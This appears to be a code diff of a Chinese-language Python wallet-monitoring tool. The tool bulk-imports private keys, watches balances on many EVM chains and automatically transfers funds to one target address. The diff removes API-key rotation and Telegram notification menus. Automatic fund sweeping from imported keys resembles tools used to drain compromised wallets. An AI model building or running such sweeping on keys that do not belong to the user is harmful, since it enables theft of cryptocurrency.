         print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
@@ -2836,18 +1527,16 @@ class WalletMonitor:
         print("  ✓ 智能错误分类和处理")
         print("  ✓ 网络状态缓存和持久化")
         
-        print(f"\n{Fore.CYAN}🔧 批量扫描策略:{Style.RESET_ALL}")
-        rate_info = calculate_optimal_scanning_params()
+        print(f"\n{Fore.CYAN}🔧 监控策略:{Style.RESET_ALL}")
         print("  • 优先检查主网 (价值更高)")
-        print("  • 批量扫描: 先完整扫描所有钱包，再统一等待间隔")
-        print(f"  • 轮次间隔: {rate_info['optimal_interval']:.1f}秒 (基于API限制优化)")
-        print("  • 最多3个钱包并发扫描")
-        print("  • 自动重试失败的网络")
-        print(f"  • 智能速率控制: {rate_info['max_requests_per_second']:.1f} 请求/秒")
-        print(f"  • 月度额度管理: {rate_info['remaining_days']}天剩余")
+        print("  • 60秒检查间隔 (避免API限制)")
+        print("  • 串行钱包监控 (确保稳定性)")
+        print("  • 智能重试和错误恢复")
+        print("  • 分批网络检查 (每批10个)")
+        print("  • 连接池管理和超时控制")
         
         print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-        confirm = enhanced_safe_input(f"{Fore.CYAN}确认启动智能监控系统? (y/N): {Style.RESET_ALL}", "n")
+        confirm = input(f"{Fore.CYAN}确认启动智能监控系统? (y/N): {Style.RESET_ALL}")
         
         if confirm.lower() in ['y', 'yes']:
             try:
@@ -2862,7 +1551,7 @@ class WalletMonitor:
         else:
             print(f"\n{Fore.YELLOW}❌ 取消监控{Style.RESET_ALL}")
         
-        enhanced_safe_input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
+        input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
     
     def show_status(self):
         """显示系统状态 - 简洁版"""
@@ -2878,28 +1567,27 @@ class WalletMonitor:
         
         # 网络状态
         available_count = sum(1 for status in self.network_status.values() if status.available)
-        mainnet_total = len(MAINNET_NETWORKS)
-        testnet_total = len(TESTNET_NETWORKS)
+        mainnet_count = sum(1 for net in MAINNET_NETWORKS 
+                           if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
+        testnet_count = sum(1 for net in TESTNET_NETWORKS 
+                           if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
         
-        print(f"🌐 网络: {available_count}/{len(SUPPORTED_NETWORKS)} 可用 (主网:{mainnet_total} 测试网:{testnet_total})")
+        print(f"🌐 网络: {available_count}/{len(SUPPORTED_NETWORKS)} 可用 (主网:{mainnet_count} 测试网:{testnet_count})")
         
-        # 转账记录和统计
-        transfer_count = TRANSFER_STATS['total_transfers']
-        total_amount = TRANSFER_STATS['total_amount_eth']
+        # 转账记录
+        transfer_count = 0
+        total_amount = 0.0
+        if os.path.exists(MONITORING_LOG_FILE):
+            try:
+                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
+                    logs = json.load(f)
+                transfer_count = len(logs)
+                total_amount = sum(float(log.get('amount', 0)) for log in logs)
+            except:
+                pass
         
         print(f"📋 转账: {transfer_count} 笔 (总计: {total_amount:.6f} ETH)")
         print(f"🎯 目标: {TARGET_ADDRESS[:12]}...{TARGET_ADDRESS[-8:]}")
-        
-        # TG通知状态
-        tg_status = "启用" if TELEGRAM_NOTIFICATIONS_ENABLED else "禁用"
-        tg_success = TRANSFER_STATS['successful_notifications']
-        tg_failed = TRANSFER_STATS['failed_notifications']
-        print(f"📱 TG通知: {tg_status} (成功: {tg_success} | 失败: {tg_failed})")
-        
-        status = get_api_keys_status()
-        rate_info = status['rate_info']
-        print(f"🔑 API轮询: #{status['current_index'] + 1}/{status['total_keys']} ({status['current_key']}) [{status['request_count']}/{status['requests_per_api']}]")
-        print(f"⚡ 速率控制: {rate_info['remaining_days']}天剩余 | {rate_info['current_usage_percent']:.1f}%已用 | 间隔{rate_info['optimal_interval']:.1f}s")
     
     def show_detailed_status(self):
         """显示详细状态 - 完整诊断版本"""
@@ -2997,41 +1685,13 @@ class WalletMonitor:
         else:
             print("  📭 暂无转账记录")
         
-        # API密钥轮询状态
-        print(f"\n{Fore.YELLOW}🔑 API密钥轮询系统:{Style.RESET_ALL}")
-        status = get_api_keys_status()
-        rate_info = status['rate_info']
-        print(f"  📊 总密钥数: {status['total_keys']} 个")
-        print(f"  🎯 当前使用: #{status['current_index'] + 1} ({status['current_key']})")
-        print(f"  🔄 轮询计数: {status['request_count']}/{status['requests_per_api']} 次")
-        print(f"  ⚡ 轮询策略: 每{status['requests_per_api']}次请求自动切换")
-        
-        # 速率控制详情
-        print(f"\n{Fore.CYAN}⚡ 智能速率控制:{Style.RESET_ALL}")
-        print(f"  📊 月度限制: {rate_info['total_monthly_limit']:,} CU ({status['total_keys']} API × 3000万)")
-        print(f"  📈 已用额度: {MONTHLY_USAGE_TRACKER['used_cu']:,} CU ({rate_info['current_usage_percent']:.1f}%)")
-        print(f"  📅 剩余天数: {rate_info['remaining_days']} 天")
-        print(f"  🎯 每日目标: {rate_info['daily_target_cu']:,.0f} CU")
-        print(f"  ⏱️ 最优间隔: {rate_info['optimal_interval']:.2f} 秒")
-        print(f"  🚀 最大速率: {rate_info['max_requests_per_second']:.1f} 请求/秒")
-        
-        print(f"\n  📋 API密钥列表:")
-        for i, key in enumerate(ALCHEMY_API_KEYS):
-            status_icon = "🟢" if i == CURRENT_API_KEY_INDEX else "⚪"
-            usage_info = f"[{API_REQUEST_COUNT}/{REQUESTS_PER_API}]" if i == CURRENT_API_KEY_INDEX else "[待用]"
-            print(f"    {status_icon} API#{i + 1}: {key[:12]}... {usage_info}")
-        
-        if len(ALCHEMY_API_KEYS) < 5:
-            print(f"\n  {Fore.CYAN}💡 添加更多API密钥位置:{Style.RESET_ALL}")
-            for j in range(len(ALCHEMY_API_KEYS), min(len(ALCHEMY_API_KEYS) + 3, 10)):
-                print(f"    ➕ API#{j + 1}: [可添加新密钥] → 扩容+3000万CU/月")
-        
         # 系统配置详情
         print(f"\n{Fore.YELLOW}⚙️ 系统配置详情:{Style.RESET_ALL}")
         print(f"  🎯 目标地址: {TARGET_ADDRESS}")
+        print(f"  🔑 API密钥: {ALCHEMY_API_KEY[:20]}...")
         print(f"  🔄 监控状态: {'🟢 运行中' if self.monitoring_active else '🔴 已停止'}")
-        print(f"  ⚡ 检查间隔: 30秒")
-        print(f"  🔀 并发限制: 最多2个钱包，3个网络并发")
+        print(f"  ⚡ 检查间隔: 60秒")
+        print(f"  🔀 并发限制: 串行监控，每批10个网络，2个并发检查")
         print(f"  💾 数据文件: wallets.json, monitoring_log.json, network_status.json")
     
     def show_help_menu(self):
@@ -3062,35 +1722,9 @@ class WalletMonitor:
         print("  • 错误智能分类: 区分API限制、网络问题、配置错误")
         print("  • 并发限制控制: 避免触发API速率限制")
         
-        print(f"\n{Fore.CYAN}🔑 API密钥轮询系统:{Style.RESET_ALL}")
-        status = get_api_keys_status()
-        print(f"  • 🔄 智能轮询: 每{status['requests_per_api']}次请求自动切换API密钥")
-        print(f"  • 📊 当前配置: {status['total_keys']} 个API密钥")
-        print(f"  • 🎯 当前使用: #{status['current_index'] + 1} ({status['current_key']})")
-        print(f"  • 🚨 故障转移: API失效时立即切换")
-        print(f"  • ➕ 扩展支持: 支持无限个API密钥")
-        print(f"  • 💡 添加方法: 在代码ALCHEMY_API_KEYS列表中添加新密钥")
-        
-        print(f"\n{Fore.YELLOW}⚡ 智能速率控制系统:{Style.RESET_ALL}")
-        rate_info = status['rate_info']
-        print(f"  • 📊 API限制: 500 CU/秒，3000万 CU/月 (每个API)")
-        print(f"  • 🔄 智能扩容: {rate_info['total_api_keys']} API = {rate_info['total_monthly_limit']:,} CU/月")
-        print(f"  • ⏱️ 动态间隔: {rate_info['optimal_interval']:.2f} 秒 (基于剩余额度)")
-        print(f"  • 📅 时间管理: {rate_info['remaining_days']} 天剩余，每日{rate_info['daily_target_cu']:,.0f} CU")
-        print(f"  • 🎯 当前使用: {rate_info['current_usage_percent']:.1f}% ({MONTHLY_USAGE_TRACKER['used_cu']:,} CU)")
-        print(f"  • 🚀 最大速率: {rate_info['max_requests_per_second']:.1f} 请求/秒")
-        print("  • 📊 重置功能: API管理菜单可重置月度统计")
-        
         print(f"\n{Fore.GREEN}🌐 支持的网络 (共{len(SUPPORTED_NETWORKS)}个):{Style.RESET_ALL}")
-        print(f"\n  {Fore.CYAN}🔷 Layer 1 主网 ({len([n for n in MAINNET_NETWORKS if n in ['ethereum', 'polygon', 'astar', 'celo', 'bsc', 'metis', 'avalanche', 'gnosis', 'rootstock']])}个):{Style.RESET_ALL}")
-        layer1_nets = ['ethereum', 'polygon', 'astar', 'celo', 'bsc', 'metis', 'avalanche', 'gnosis', 'rootstock']
-        for net in layer1_nets:
-            if net in NETWORK_NAMES:
-                print(f"    • {NETWORK_NAMES[net]}")
-        
-        print(f"\n  {Fore.MAGENTA}🔷 Layer 2 主网 ({len([n for n in MAINNET_NETWORKS if n not in layer1_nets])}个):{Style.RESET_ALL}")
-        layer2_nets = [n for n in MAINNET_NETWORKS if n not in layer1_nets]
-        for net in layer2_nets:
+        print(f"\n  {Fore.CYAN}🔷 主网 ({len(MAINNET_NETWORKS)}个):{Style.RESET_ALL}")
+        for net in MAINNET_NETWORKS:
             print(f"    • {NETWORK_NAMES[net]}")
         
         print(f"\n  {Fore.YELLOW}🧪 测试网 ({len(TESTNET_NETWORKS)}个):{Style.RESET_ALL}")
@@ -3102,10 +1736,9 @@ class WalletMonitor:
         print("  • 监控过程需要稳定的网络连接")
         print("  • 建议在VPS或云服务器上24小时运行")
         print("  • 定期备份wallets.json和monitoring_log.json")
-        print("  • API密钥会自动轮换使用")
         
         print(f"\n{Fore.YELLOW}🔧 故障排除指南:{Style.RESET_ALL}")
-        print("  • API错误403: 系统会自动切换到备用API密钥")
+        print("  • API错误403: 检查API密钥是否有效")
         print("  • 网络连接失败: 检查服务器网络连接")
         print("  • 导入失败: 确认私钥格式为64位十六进制")
         print("  • 监控卡死: 重启程序，系统会自动恢复状态")
@@ -3115,526 +1748,31 @@ class WalletMonitor:
         print("  • 系统会自动保存所有状态和日志")
         print("  • 重启后会自动恢复钱包和网络配置")
         print("  • 所有操作都有详细的日志记录")
-        print("  • 双API密钥确保高可用性")
     
-    def api_key_management_menu(self):
-        """API密钥管理菜单"""
+    def main_menu(self):
+        """主菜单 - 完全优化的交互体验"""
         while True:
-            try:
-                os.system('clear' if os.name == 'posix' else 'cls')
-            except:
-                print("\n" * 50)  # 替代清屏
+            # 清屏，提供清爽的界面
+            os.system('clear' if os.name == 'posix' else 'cls')
             
-            print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}🔑 API密钥轮询管理系统{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}🔐 钱包监控转账系统 v3.0 - 纯RPC网络支持版{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}支持{len(SUPPORTED_NETWORKS)}个EVM兼容链 | 纯RPC模式 | 智能并发优化 | 人性化交互{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
             
-            status = get_api_keys_status()
+            self.show_status()
             
-            print(f"\n{Fore.YELLOW}📊 当前状态:{Style.RESET_ALL}")
-            print(f"  📊 总密钥数: {status['total_keys']} 个")
-            print(f"  🎯 当前使用: #{status['current_index'] + 1} ({status['current_key']})")
-            print(f"  🔄 轮询计数: {status['request_count']}/{status['requests_per_api']} 次")
-            print(f"  ⚡ 轮询策略: 每{status['requests_per_api']}次请求自动切换")
-            
-            print(f"\n{Fore.CYAN}📋 API密钥列表:{Style.RESET_ALL}")
-            for i, key in enumerate(ALCHEMY_API_KEYS):
-                status_icon = "🟢" if i == CURRENT_API_KEY_INDEX else "⚪"
-                usage_info = f"[使用中 {API_REQUEST_COUNT}/{REQUESTS_PER_API}]" if i == CURRENT_API_KEY_INDEX else "[待轮询]"
-                print(f"  {status_icon} API#{i + 1}: {key[:20]}... {usage_info}")
-            
-            # 显示可添加的位置
-            print(f"\n{Fore.GREEN}➕ 可添加API密钥位置:{Style.RESET_ALL}")
-            for j in range(len(ALCHEMY_API_KEYS), len(ALCHEMY_API_KEYS) + 3):
-                print(f"  ➕ API#{j + 1}: [空位，可添加新密钥]")
-            
-            # 显示速率控制信息
-            print(f"\n{Fore.YELLOW}⚡ 速率控制状态:{Style.RESET_ALL}")
-            rate_info = status['rate_info']
-            print(f"  📊 月度限制: {rate_info['total_monthly_limit']:,} CU")
-            print(f"  📈 已用: {MONTHLY_USAGE_TRACKER['used_cu']:,} CU ({rate_info['current_usage_percent']:.1f}%)")
-            print(f"  📅 剩余: {rate_info['remaining_days']} 天")
-            print(f"  ⏱️ 最优间隔: {rate_info['optimal_interval']:.2f} 秒")
-            
-            print(f"\n{Fore.YELLOW}🔧 管理功能:{Style.RESET_ALL}")
-            print(f"  {Fore.CYAN}1.{Style.RESET_ALL} ➕ 添加新API密钥 (扩容+3000万CU/月)")
-            print(f"  {Fore.CYAN}2.{Style.RESET_ALL} 🔄 手动切换API密钥")
-            print(f"  {Fore.CYAN}3.{Style.RESET_ALL} ⚙️ 设置轮询频率")
-            print(f"  {Fore.CYAN}4.{Style.RESET_ALL} 📊 重置月度使用统计")
-            print(f"  {Fore.CYAN}5.{Style.RESET_ALL} 🧪 测试所有API密钥")
-            print(f"  {Fore.CYAN}6.{Style.RESET_ALL} 📱 TG通知设置")
-            print(f"  {Fore.CYAN}7.{Style.RESET_ALL} 🔙 返回主菜单")
+            print(f"\n{Fore.YELLOW}📋 功能菜单:{Style.RESET_ALL}")
+            print(f"  {Fore.CYAN}1.{Style.RESET_ALL} 📥 导入私钥    {Fore.GREEN}(智能批量识别，支持任意格式){Style.RESET_ALL}")
+            print(f"  {Fore.CYAN}2.{Style.RESET_ALL} 🎯 开始监控    {Fore.GREEN}(并发优化，3倍速度提升){Style.RESET_ALL}")
+            print(f"  {Fore.CYAN}3.{Style.RESET_ALL} 📊 详细状态    {Fore.GREEN}(完整诊断，网络分析){Style.RESET_ALL}")
+            print(f"  {Fore.CYAN}4.{Style.RESET_ALL} 📖 使用帮助    {Fore.GREEN}(完整指南，故障排除){Style.RESET_ALL}")
+            print(f"  {Fore.CYAN}5.{Style.RESET_ALL} 🚪 退出程序    {Fore.GREEN}(安全退出，保存状态){Style.RESET_ALL}")
             
             print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
             
             try:
-                choice = enhanced_safe_input(f"{Fore.CYAN}请选择功能 (1-7): {Style.RESET_ALL}", "7").strip()
-                
-                # 验证输入是否为有效数字
-                if choice not in ["1", "2", "3", "4", "5", "6", "7"]:
-                    print(f"\n{Fore.RED}❌ 无效选择 '{choice}'，请输入 1-7{Style.RESET_ALL}")
-                    print(f"{Fore.YELLOW}💡 提示: 请输入菜单中显示的数字 (1、2、3、4、5、6 或 7){Style.RESET_ALL}")
-                    time.sleep(3)
-                    continue
-                
-                if choice == "1":
-                    self.add_new_api_key()
-                elif choice == "2":
-                    self.manual_switch_api_key()
-                elif choice == "3":
-                    self.set_rotation_frequency()
-                elif choice == "4":
-                    self.reset_monthly_usage()
-                elif choice == "5":
-                    self.test_all_api_keys()
-                elif choice == "6":
-                    self.telegram_settings_menu()
-                elif choice == "7":
-                    break
-                    
-            except KeyboardInterrupt:
-                break
-    
-    def add_new_api_key(self):
-        """添加新API密钥"""
-        print(f"\n{Fore.CYAN}➕ 添加新API密钥{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}💡 请输入新的Alchemy API密钥{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}格式示例: abcd1234efgh5678ijkl9012mnop3456{Style.RESET_ALL}")
-        
-        new_key = enhanced_safe_input(f"\n{Fore.CYAN}新API密钥: {Style.RESET_ALL}", "")
-        
-        if not new_key:
-            print(f"{Fore.RED}❌ API密钥不能为空{Style.RESET_ALL}")
-        elif len(new_key) < 20:
-            print(f"{Fore.RED}❌ API密钥长度不足，请输入完整密钥{Style.RESET_ALL}")
-        elif new_key in ALCHEMY_API_KEYS:
-            print(f"{Fore.YELLOW}⚠️ 该API密钥已存在{Style.RESET_ALL}")
-        else:
-            if add_api_key(new_key):
-                # 刷新网络配置
-                refresh_network_config()
-                print(f"{Fore.GREEN}🎉 API密钥添加成功！{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}💡 系统现在支持 {len(ALCHEMY_API_KEYS)} 个API密钥轮询{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.RED}❌ 添加失败{Style.RESET_ALL}")
-        
-        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
-    
-    def manual_switch_api_key(self):
-        """手动切换API密钥"""
-        if len(ALCHEMY_API_KEYS) <= 1:
-            print(f"\n{Fore.YELLOW}⚠️ 只有一个API密钥，无法切换{Style.RESET_ALL}")
-            enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
-            return
-        
-        old_key = get_current_api_key()
-        force_switch_api_key()
-        new_key = get_current_api_key()
-        
-        print(f"\n{Fore.GREEN}🔄 API密钥已切换{Style.RESET_ALL}")
-        print(f"  旧密钥: {old_key[:12]}...")
-        print(f"  新密钥: {new_key[:12]}...")
-        print(f"  当前位置: #{CURRENT_API_KEY_INDEX + 1}/{len(ALCHEMY_API_KEYS)}")
-        
-        # 刷新网络配置
-        refresh_network_config()
-        
-        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
-    
-    def set_rotation_frequency(self):
-        """设置轮询频率"""
-        global REQUESTS_PER_API
-        
-        print(f"\n{Fore.CYAN}⚙️ 设置API密钥轮询频率{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}当前频率: 每 {REQUESTS_PER_API} 次请求切换一次API密钥{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}建议范围: 3-10 次（过低可能触发限制，过高可能不够均匀）{Style.RESET_ALL}")
-        
-        try:
-            new_freq = enhanced_safe_input(f"\n{Fore.CYAN}新轮询频率 (回车保持当前): {Style.RESET_ALL}", "")
-            
-            if new_freq:
-                freq = int(new_freq)
-                if 1 <= freq <= 50:
-                    REQUESTS_PER_API = freq
-                    print(f"{Fore.GREEN}✅ 轮询频率已设置为: 每 {REQUESTS_PER_API} 次请求切换{Style.RESET_ALL}")
-                else:
-                    print(f"{Fore.RED}❌ 频率必须在 1-50 之间{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.CYAN}💡 保持当前频率: {REQUESTS_PER_API}{Style.RESET_ALL}")
-                
-        except ValueError:
-            print(f"{Fore.RED}❌ 请输入有效数字{Style.RESET_ALL}")
-        
-        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
-    
-    def test_all_api_keys(self):
-        """测试所有API密钥"""
-        print(f"\n{Fore.CYAN}🧪 测试所有API密钥...{Style.RESET_ALL}")
-        
-        for i, api_key in enumerate(ALCHEMY_API_KEYS):
-            print(f"\n{Fore.CYAN}[{i + 1}/{len(ALCHEMY_API_KEYS)}] 测试 API#{i + 1}: {api_key[:12]}...{Style.RESET_ALL}")
-            
-            try:
-                # 使用Ethereum主网测试
-                test_url = f'https://eth-mainnet.g.alchemy.com/v2/{api_key}'
-                web3 = Web3(Web3.HTTPProvider(test_url, request_kwargs={'timeout': 10}))
-                
-                # 测试基本连接
-                block_number = web3.eth.get_block_number()
-                print(f"  ✅ 连接成功 - 当前区块: {block_number}")
-                
-                # 测试余额查询
-                balance = web3.eth.get_balance("0x0000000000000000000000000000000000000000")
-                print(f"  ✅ 余额查询成功")
-                
-                print(f"  {Fore.GREEN}🎉 API#{i + 1} 测试通过{Style.RESET_ALL}")
-                
-            except Exception as e:
-                error_msg = str(e)
-                if "403" in error_msg or "401" in error_msg:
-                    print(f"  {Fore.RED}❌ API#{i + 1} 认证失败 (403/401){Style.RESET_ALL}")
-                elif "429" in error_msg:
-                    print(f"  {Fore.YELLOW}⚠️ API#{i + 1} 速率限制 (429){Style.RESET_ALL}")
-                else:
-                    print(f"  {Fore.RED}❌ API#{i + 1} 测试失败: {error_msg[:40]}...{Style.RESET_ALL}")
-            
-            time.sleep(0.5)  # 避免连续测试触发限制
-        
-        print(f"\n{Fore.GREEN}🎉 所有API密钥测试完成{Style.RESET_ALL}")
-        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
-    
-    def reset_monthly_usage(self):
-        """重置月度使用统计"""
-        print(f"\n{Fore.YELLOW}📊 重置月度使用统计{Style.RESET_ALL}")
-        
-        current_usage = MONTHLY_USAGE_TRACKER['used_cu']
-        rate_info = calculate_optimal_scanning_params()
-        
-        print(f"当前已用: {current_usage:,} CU ({rate_info['current_usage_percent']:.1f}%)")
-        print(f"月度限制: {rate_info['total_monthly_limit']:,} CU")
-        print(f"剩余天数: {rate_info['remaining_days']} 天")
-        
-        confirm = enhanced_safe_input(f"\n{Fore.YELLOW}确认重置月度使用统计? (y/N): {Style.RESET_ALL}", "n").lower()
-        
-        if confirm in ['y', 'yes']:
-            MONTHLY_USAGE_TRACKER['used_cu'] = 0
-            MONTHLY_USAGE_TRACKER['last_reset'] = datetime.now().isoformat()
-            print(f"{Fore.GREEN}✅ 月度使用统计已重置{Style.RESET_ALL}")
-            
-            # 重新计算最优参数
-            new_rate_info = calculate_optimal_scanning_params()
-            print(f"{Fore.CYAN}📊 新的每日目标: {new_rate_info['daily_target_cu']:,.0f} CU{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}⏱️ 新的最优间隔: {new_rate_info['optimal_interval']:.2f} 秒{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}🚀 最大速率: {new_rate_info['max_requests_per_second']:.1f} 请求/秒{Style.RESET_ALL}")
-        else:
-            print(f"{Fore.CYAN}取消重置{Style.RESET_ALL}")
-        
-        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
-    
-    def telegram_settings_menu(self):
-        """TG通知设置菜单"""
-        print(f"\n{Fore.CYAN}📱 Telegram通知设置{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}📊 当前设置:{Style.RESET_ALL}")
-        print(f"  状态: {'✅ 启用' if TELEGRAM_NOTIFICATIONS_ENABLED else '❌ 禁用'}")
-        print(f"  Bot Token: {TELEGRAM_BOT_TOKEN[:20]}...{TELEGRAM_BOT_TOKEN[-10:] if len(TELEGRAM_BOT_TOKEN) > 30 else TELEGRAM_BOT_TOKEN}")
-        print(f"  Chat ID: {TELEGRAM_CHAT_ID}")
-        
-        print(f"\n{Fore.YELLOW}📊 通知统计:{Style.RESET_ALL}")
-        print(f"  成功发送: {TRANSFER_STATS['successful_notifications']} 次")
-        print(f"  发送失败: {TRANSFER_STATS['failed_notifications']} 次")
-        total_attempts = TRANSFER_STATS['successful_notifications'] + TRANSFER_STATS['failed_notifications']
-        success_rate = (TRANSFER_STATS['successful_notifications'] / total_attempts * 100) if total_attempts > 0 else 0
-        print(f"  成功率: {success_rate:.1f}%")
-        
-        print(f"\n{Fore.CYAN}🔧 管理选项:{Style.RESET_ALL}")
-        print(f"  1. {'❌ 禁用' if TELEGRAM_NOTIFICATIONS_ENABLED else '✅ 启用'}通知")
-        print(f"  2. 🧪 发送测试消息")
-        print(f"  3. 📊 查看详细统计")
-        print(f"  4. 🔙 返回上级菜单")
-        
-        choice = enhanced_safe_input(f"\n{Fore.CYAN}请选择 (1-4): {Style.RESET_ALL}", "4")
-        
-        if choice == "1":
-            self.toggle_telegram_notifications()
-        elif choice == "2":
-            self.send_test_telegram_message()
-        elif choice == "3":
-            self.show_detailed_telegram_stats()
-        
-        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
-    
-    def toggle_telegram_notifications(self):
-        """切换TG通知状态"""
-        global TELEGRAM_NOTIFICATIONS_ENABLED
-        
-        old_status = TELEGRAM_NOTIFICATIONS_ENABLED
-        TELEGRAM_NOTIFICATIONS_ENABLED = not TELEGRAM_NOTIFICATIONS_ENABLED
-        
-        status_text = "启用" if TELEGRAM_NOTIFICATIONS_ENABLED else "禁用"
-        print(f"\n{Fore.GREEN}✅ TG通知已{status_text}{Style.RESET_ALL}")
-    
-    def send_test_telegram_message(self):
-        """发送测试TG消息"""
-        print(f"\n{Fore.CYAN}🧪 发送测试消息...{Style.RESET_ALL}")
-        
-        test_message = f"""🔧 <b>测试消息</b>
-
-📱 这是一条来自钱包监控系统的测试消息
-⏰ 时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-🎯 目标地址: <code>{TARGET_ADDRESS[:12]}...{TARGET_ADDRESS[-8:]}</code>
-📊 当前监控: {len(self.wallets)} 个钱包
-
-✅ 如果您收到此消息，说明通知系统工作正常！"""
-        
-        try:
-            import asyncio
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            success = loop.run_until_complete(send_telegram_notification(test_message))
-            loop.close()
-            
-            if success:
-                print(f"{Fore.GREEN}✅ 测试消息发送成功！{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.RED}❌ 测试消息发送失败{Style.RESET_ALL}")
-        except Exception as e:
-            print(f"{Fore.RED}❌ 测试失败: {str(e)[:50]}...{Style.RESET_ALL}")
-    
-    def show_detailed_telegram_stats(self):
-        """显示详细TG统计"""
-        print(f"\n{Fore.CYAN}📊 Telegram通知详细统计{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
-        
-        total_transfers = TRANSFER_STATS['total_transfers']
-        successful_notifications = TRANSFER_STATS['successful_notifications']
-        failed_notifications = TRANSFER_STATS['failed_notifications']
-        total_attempts = successful_notifications + failed_notifications
-        
-        print(f"📊 总转账次数: {total_transfers}")
-        print(f"📱 通知尝试次数: {total_attempts}")
-        print(f"✅ 成功发送: {successful_notifications}")
-        print(f"❌ 发送失败: {failed_notifications}")
-        
-        if total_attempts > 0:
-            success_rate = (successful_notifications / total_attempts) * 100
-            print(f"📈 成功率: {success_rate:.1f}%")
-        
-        if total_transfers > 0:
-            notification_coverage = (total_attempts / total_transfers) * 100
-            print(f"📋 通知覆盖率: {notification_coverage:.1f}%")
-        
-        if TRANSFER_STATS['last_transfer_time']:
-            last_time = datetime.fromisoformat(TRANSFER_STATS['last_transfer_time'])
-            print(f"⏰ 最后转账: {last_time.strftime('%Y-%m-%d %H:%M:%S')}")
-    
-    def restart_program(self):
-        """重启程序 - 清理缓存并重新初始化"""
-        print(f"\n{Fore.YELLOW}🔄 程序重启{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}这将清理所有缓存并重新初始化系统{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}✅ 日志文件将被保留{Style.RESET_ALL}")
-        
-        confirm = enhanced_safe_input(f"\n{Fore.YELLOW}确认重启程序? (y/N): {Style.RESET_ALL}", "n").lower()
-        
-        if confirm in ['y', 'yes']:
-            print(f"\n{Fore.CYAN}🔄 正在重启...{Style.RESET_ALL}")
-            
-            # 清理缓存
-            smart_cache_cleanup()
-            
-            # 重新初始化
-            try:
-                print(f"{Fore.CYAN}🔄 重新初始化网络连接...{Style.RESET_ALL}")
-                self.web3_clients.clear()
-                self.network_status.clear()
-                
-                # 重新构建网络配置
-                refresh_network_config()
-                
-                # 重新初始化客户端
-                self.initialize_clients()
-                
-                print(f"{Fore.GREEN}✅ 程序重启完成{Style.RESET_ALL}")
-                time.sleep(1)
-                
-            except Exception as e:
-                print(f"{Fore.RED}❌ 重启失败: {e}{Style.RESET_ALL}")
-                print(f"{Fore.YELLOW}💡 请手动重启程序{Style.RESET_ALL}")
-        else:
-            print(f"{Fore.CYAN}取消重启{Style.RESET_ALL}")
-        
-        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
-    
-    def show_enhanced_status(self):
-        """显示美化的系统状态"""
-        # 获取基本状态信息
-        available_networks = sum(1 for status in self.network_status.values() if status.available)
-        total_networks = len(SUPPORTED_NETWORKS)
-        mainnet_count = sum(1 for net_key in SUPPORTED_NETWORKS.keys() 
-                           if net_key in MAINNET_NETWORKS and 
-                           self.network_status.get(net_key, NetworkStatus(False, "", 0, "")).available)
-        testnet_count = available_networks - mainnet_count
-        
-        # 获取API和速率信息
-        rate_info = calculate_optimal_scanning_params()
-        api_status = get_api_keys_status()
-        
-        # 获取转账统计
-        total_transfers = TRANSFER_STATS['total_transfers']
-        total_amount = TRANSFER_STATS['total_amount_eth']
-        erc20_transfers = TRANSFER_STATS.get('erc20_transfers', 0)
-        
-        # 🎨 美化状态框
-        print(f"{Fore.YELLOW}┌─── {Fore.CYAN}📊 系统状态概览{Fore.YELLOW} ───────────────────────────────────────────────────┐{Style.RESET_ALL}")
-        
-        # 钱包信息行
-        wallet_status = f"{Fore.GREEN}✅ {len(self.wallets)} 个已导入{Style.RESET_ALL}" if self.wallets else f"{Fore.RED}❌ 未导入钱包{Style.RESET_ALL}"
-        print(f"{Fore.YELLOW}│{Style.RESET_ALL} 💼 {Fore.CYAN}钱包:{Style.RESET_ALL} {wallet_status:<35} {Fore.LIGHTBLACK_EX}目标: {TARGET_ADDRESS[:12]}...{TARGET_ADDRESS[-8:]}{Style.RESET_ALL} {Fore.YELLOW}│{Style.RESET_ALL}")
-        
-        # 网络信息行  
-        network_bar = self.create_progress_bar(available_networks, total_networks, 20)
